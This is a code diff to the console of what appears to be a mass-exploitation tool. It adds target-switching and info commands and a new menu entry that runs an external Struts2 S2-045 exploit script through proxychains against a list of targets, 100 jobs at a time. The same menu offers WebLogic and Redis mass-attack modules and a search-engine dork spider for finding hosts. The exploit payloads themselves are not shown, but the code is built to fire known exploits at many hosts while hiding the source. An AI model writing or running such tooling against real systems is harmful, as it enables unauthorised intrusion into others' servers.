@@ -43,9 +43,22 @@ def jexboss(cmd, exploit_path):
 
 def execute(cmd):
     global proxy_conf
+    global ip_list
+    global init_dir
     cmd = str(cmd).lower().strip()
     if cmd == '':
         pass
+    elif cmd == 'info':
+        print(
+            colors.CYAN +
+            '[*] Init directory: {}\n[*] Target: {}\n[*] Proxy config: {}'.format(
+                init_dir,
+                ip_list,
+                proxy_conf))
+    elif cmd.startswith('target'):
+        target = ''.join(cmd.split()[1:])
+        print(colors.BLUE + '[i] Target changed to {}'.format(target))
+        ip_list = 'data/' + target
     elif cmd == 'init' or cmd == 'i':
         print(colors.CYAN + '[*] Going back to init_dir...' + colors.END)
         os.chdir(init_dir)
@@ -59,8 +72,6 @@ def execute(cmd):
             baidu.spider(dork, count)
         except Exception as e:
             console.print_error('[-] Error with baidu: ' + str(e))
-    elif cmd == 'target' or cmd == 't':
-        print(colors.CYAN + ip_list + colors.END)
     elif cmd == 'proxy':
         if not os.path.exists('data/ss.json'):
             console.print_error('[-] Please make sure \"data/ss.json\" exists')
@@ -194,6 +205,7 @@ def weblogic():
     scanner(scanner_args)
 
 
+# currently not available
 def redis():
     print(colors.BLUE + '\n[*] Welcome to Redis exploit' + colors.END)
     answ = input(
@@ -204,6 +216,27 @@ def redis():
                          proxy_conf, 'python', 'massAttack.py'])
     else:
         pass
+
+
+def s2_045():
+    print(colors.BLUE + '\n[*] Welcome to S2-045' + colors.END)
+    port = str(input('[?] What\'s the port of your target server? ').strip())
+
+    # args list
+    exploit = 's2_045_cmd.py'
+    work_path = '/structs2/'
+    exec_path = exploit
+    custom_args = ('-p ' + port).split()
+    jobs = 100
+
+    print(
+        colors.BLUE +
+        '[*] Your exploit will be executed like\n' +
+        colors.END,
+        'proxychains4 -q -f proxy.conf {} -t <target ip>'.format(exec_path), ' '.join(custom_args))
+    # start scanner
+    scanner_args = (exploit, work_path, exec_path, custom_args, jobs)
+    scanner(scanner_args)
 
 
 def attack():
@@ -235,6 +268,8 @@ def attack():
             console.print_error('\n[-] Under development')
         elif answ == 0:
             weblogic()
+        elif answ == 3:
+            s2_045()
         else:
             console.print_error('\n[-] Invalid input!')
     elif answ == 'm':
